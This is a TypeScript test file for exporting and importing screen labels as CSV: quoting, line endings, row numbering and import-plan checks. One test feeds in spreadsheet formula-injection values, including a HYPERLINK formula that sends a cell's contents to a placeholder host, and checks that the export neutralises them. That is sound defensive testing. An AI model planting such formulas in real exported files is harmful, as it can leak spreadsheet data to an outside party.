// Screen labels as CSV (#188): the download read back by the same parser as an import, the edges of the format, and
// the plan an import makes before anything is sent.
import { describe, expect, it } from 'vitest';
import { importPlan, labelsCsv, readLabelCsv } from '../src/lib/label-csv';
import type { ScreenView } from '../src/lib/screen-types';

const screen = (id: string, name: string, labels: Record<string, string>) => ({ id, name, labels, systemLabels: {} }) as unknown as ScreenView;
const read = (text: string) => {
  const r = readLabelCsv(text);
  if (!r.ok) throw new Error(r.error);
  return r;
};

describe('the download', () => {
  it('reads back as it was written: quotes, commas, line breaks and edge spaces in values', () => {
    const screens = [
      screen('scr_1', 'Lobby, north', { note: 'say "hi"', region: 'north' }),
      screen('scr_2', 'Till\nfront', { note: ' two\r\nlines ', store: '0142' }),
      screen('scr_3', 'Plain', {}),
    ];
    const csv = labelsCsv(screens);
    expect(csv.split('\r\n')[0]).toBe('screen_id,name,note,region,store');
    const back = read(csv);
    expect(back.columns).toEqual(['screen_id', 'name', 'note', 'region', 'store']);
    expect(back.rows).toEqual([
      ['scr_1', 'Lobby, north', 'say "hi"', 'north', ''],
      ['scr_2', 'Till\nfront', ' two\r\nlines ', '', '0142'],
      ['scr_3', 'Plain', '', '', ''],
    ]);
  });

  it('writes no cell a spreadsheet would run as a formula, and reads each back as it was (review of #612)', () => {
    const labels = { link: '=HYPERLINK("https://x.test/?"&A1,"open")', sum: '+SUM(1)', at: '@x', minus: '-2+3', quote: "'kept", plain: 'north' };
    const csv = labelsCsv([screen('scr_1', '=1+1', labels)]);
    const [header, row] = csv.split('\r\n');
    expect(header).toBe('screen_id,name,at,link,minus,plain,quote,sum');
    expect(row).toBe(`scr_1,'=1+1,'@x,"'=HYPERLINK(""https://x.test/?""&A1,""open"")",'-2+3,north,''kept,'+SUM(1)`);
    expect(read(csv).rows).toEqual([['scr_1', '=1+1', '@x', labels.link, '-2+3', 'north', "'kept", '+SUM(1)']]);
    // A `'` the person typed before other text is theirs, and stays.
    expect(read("screen_id,note\nscr_1,'tis\n").rows).toEqual([['scr_1', "'tis"]]);
  });

  it("reads back a large fleet's download: 1,000 screens with 31 keys (review of #612)", () => {
    const keys = Array.from({ length: 31 }, (_, k) => `key-${String(k).padStart(2, '0')}`);
    const screens = Array.from({ length: 1000 }, (_, i) => screen(`scr_${i}`, `Screen ${i}`, Object.fromEntries(keys.map((k) => [k, `v${i}`]))));
    const back = read(labelsCsv(screens));
    expect(back.columns).toHaveLength(33);
    expect(back.rows).toHaveLength(1000);
    expect(importPlan(back, screens, 'replace')).toEqual({ changes: [], problems: [], skipped: [] });
  });
});

describe('reading a file', () => {
  it('takes a byte order mark, CRLF or LF lines, and a quoted header', () => {
    expect(read('﻿screen_id,"region"\r\nscr_1,north\r\n').columns).toEqual(['screen_id', 'region']);
    expect(read('screen_id,region\nscr_1,north\n').rows).toEqual([['scr_1', 'north']]);
  });

  it('says why a file cannot be read: a quote never closed, two columns of one name', () => {
    expect(readLabelCsv('screen_id,region\nscr_1,"north\n')).toMatchObject({ ok: false, error: expect.stringMatching(/never closes/) });
    expect(readLabelCsv('screen_id,region,region\nscr_1,a,b\n')).toMatchObject({ ok: false, error: expect.stringMatching(/two columns/) });
  });
});

describe('an import’s plan', () => {
  const screens = [
    screen('scr_1', 'Lobby', { region: 'north', store: '0142' }),
    screen('scr_2', 'Till', { region: 'south' }),
    screen('scr_3', 'Twin', {}),
    screen('scr_4', 'Twin', {}),
  ];
  const plan = (text: string, mode: 'merge' | 'replace' = 'merge') => importPlan(read(text), screens, mode);

  it('says each screen’s labels added, changed and removed; merge ignores an empty cell, replace removes the label', () => {
    const text = 'screen_id,name,region,store,type\nscr_1,,north,,kiosk\n,Till,North ,9,\n';
    expect(plan(text).changes).toEqual([
      { screenId: 'scr_1', name: 'Lobby', added: [['type', 'kiosk']], changed: [], removed: [], set: { type: 'kiosk' }, remove: [] },
      {
        screenId: 'scr_2',
        name: 'Till',
        added: [['store', '9']],
        changed: [['region', 'south', 'North']],
        removed: [],
        set: { region: 'North', store: '9' },
        remove: [],
      },
    ]);
    expect(plan(text, 'replace').changes[0]).toMatchObject({ removed: [['store', '0142']], remove: ['store'] });
  });

  it('matches by screen_id, else by an exact name; lists a name two screens have, no such screen, and a screen named twice', () => {
    const p = plan('screen_id,name,region\n,Twin,x\nscr_9,,x\n,Nobody,x\nscr_1,,a\n,Lobby,b\n');
    expect(p.skipped).toEqual([
      'Row 2: 2 screens are named Twin; give its screen_id.',
      'Row 3: no screen scr_9.',
      'Row 4: no screen named Nobody.',
      'Row 6: Lobby is in an earlier row too; only the first is read.',
    ]);
    expect(p.changes.map((c) => c.screenId)).toEqual(['scr_1']);
  });

  it('refuses a system label, a key the editor refuses, two columns of one key, and a value the server would, in their words', () => {
    const p = plan('screen_id,orientation,Region,region,name2,id,bad key\nscr_1,portrait,a,b,c,d,e\n');
    expect(p.problems).toEqual(
      expect.arrayContaining([
        "Column orientation: a system label, set by the screen's settings.",
        'Column region: two columns are this key once lowercased. Keep one.',
        'Column id: name, id and status are not labels.',
        expect.stringMatching(/^Column bad key: a label key is 1 to 63 lowercase/),
      ]),
    );
    expect(plan(`screen_id,region\nscr_1,${'x'.repeat(64)}\n`).problems).toEqual(['Row 2, region: a label value is at most 63 characters.']);
  });

  it('needs a column that finds the screen', () => {
    expect(plan('region\nnorth\n').problems).toEqual(["The file needs a screen_id or a name column to find each row's screen."]);
  });

  it('names a row as the spreadsheet does: a blank line counted, a quoted line break not (review of #612)', () => {
    expect(plan('screen_id,note\nscr_1,"two\nlines"\n\nscr_9,x\n').skipped).toEqual(['Row 4: no screen scr_9.']);
  });

  it('finds a screen whose name has a space at an edge by its name (review of #612)', () => {
    const spaced = [screen('scr_5', ' Kiosk ', {})];
    expect(importPlan(read('name,region\nKiosk,north\n'), spaced, 'merge').changes.map((c) => c.screenId)).toEqual(['scr_5']);
  });
});
